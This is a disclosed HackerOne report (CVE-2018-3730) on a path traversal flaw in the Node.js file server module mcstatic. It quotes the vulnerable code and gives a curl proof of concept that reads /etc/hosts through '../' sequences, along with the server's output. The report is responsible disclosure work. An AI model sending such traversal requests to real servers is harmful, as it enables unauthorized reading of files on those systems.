---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-04-24
submitted: 2018-02-06T15:43:16.553Z
bounty_usd: null
votes: 6
cve: "CVE-2018-3730"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "bl4de"
source: "https://hackerone.com/reports/312907"
title: "[mcstatic] Path Traversal allows to read content of arbitrary files"
---
# [mcstatic] Path Traversal allows to read content of arbitrary files

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Node.js third-party modules | **Disclosed:** 2018-04-24

- Report: [https://hackerone.com/reports/312907](https://hackerone.com/reports/312907)
- CWE: Path Traversal | CVE: CVE-2018-3730
- Submitted: 2018-02-06T15:43:16.553Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi Guys,

There is Path Traversal in mcstatic module.
It allows to read content of arbitrary files on the remote server.

## Module

**mcstatic**

This is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.

https://www.npmjs.com/package/mcstatic

version: 0.0.20

Stats
0 downloads in the last day
38 downloads in the last week
150 downloads in the last month

~1800 estimated downloads per year


## Description

Lack of file path sanitization causes that any file on the server might be read by malicious user.

If we follow code flow, we find that first file name is read from ```req.url``` and check if exists:

```javascript
// node_modules/mcstatic/lib/staticFileHandler.js, line 19:
    var filePath = httpHelpers.getRequestPathFromUrl(req.url);
    var mockedFilePath = findMockFilePath(filePath,mockPaths);
    if(mockedFilePath)
        filePath = mockedFilePath;

    var file = path.normalize(path.join(root,filePath));
    fs.stat(file,function(error, stats){
        if(error)
            return statusHandlers[500](res, nextHandler, { error: error });
```

Depends on HTTP method used, handler function is called (here's for GET):

```javascript
// node_modules/mcstatic/lib/staticFileHandler.js, line 39:
if (req.method === 'GET')
        return responseHandlers.handleGet(res,file, stats, nextHandler);
```

```handleGet``` maps to ```streamResponse``` in ```responseHanders.js```:

```javascript
// node_modules/mcstatic/lib/responseHandlers.js, line 22:
var streamResponse = function(res, file, stat, next){
    var stream = fs.createReadStream(file);
    res.setHeader('content-length', stat.size);

    stream.pipe(res);
    stream.on('error', function (err) {
        statusHandlers['500'](res, next, { error: err });
    });

    stream.on('end', function () {
        res.statusCode = 200;
        res.end();
    });
};
```

We can see (line 23) that ```stream``` is created directly from ```file``` and piped to ```res``` response object.


## Steps To Reproduce:


- install ```mcstatic```:

```
$ npm install mcstatic
```

- run ```mcstatic``` in direcotry of your choice:

```
me:~/playground/hackerone/Node$ ./node_modules/mcstatic/bin/mcstatic 
mcstatic serving ./ on port 8080
```

- execute following ```curl``` command (adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts
```

- see result:

```
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../etc/hosts HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< last-modified: Tue, 23 Jan 2018 14:51:52 GMT
< content-length: 188
< content-type: application/octet-stream
< Date: Tue, 06 Feb 2018 15:40:51 GMT
< Connection: keep-alive
< 
127.0.0.1	localhost
127.0.1.1	LT0081U2

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
* Connection #0 to host 127.0.0.1 left intact
```

## Supporting Material/References:


- Ubuntu 16.04 LTS
- Chromium 66.0.3333.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.4 LTS
- npm version: 5.6.0
- curl 7.47.0


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows to read content of any file on the server where module is run.

## Timeline

- **Report Filed**
- **Changed Scope**
- **Report Severity Updated**
- **Report Triaged**
- **2018-02-07** @lirantal: Hi @bl4de ,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **Cve Id Added**
- **2018-02-14** @lirantal: Since the author didn't join the report I opened a security issue in the repo.
- **2018-04-24** @lirantal: Disclosing the report due to no activity from the author.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
